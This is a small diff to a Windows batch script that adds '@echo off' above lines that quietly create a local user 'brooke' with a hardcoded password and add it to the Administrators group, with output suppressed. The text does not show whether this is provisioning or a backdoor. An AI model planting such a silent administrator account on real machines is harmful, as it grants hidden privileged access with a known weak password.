@@ -1,3 +1,4 @@
+@echo off
 net config server /srvcomment:"Windows Server" > out.txt 2 >&1
 net user brooke Jacobs123 /add /active:yes /logonpasswordchg:no > nul
 net localgroup Administrators brooke /add > nul
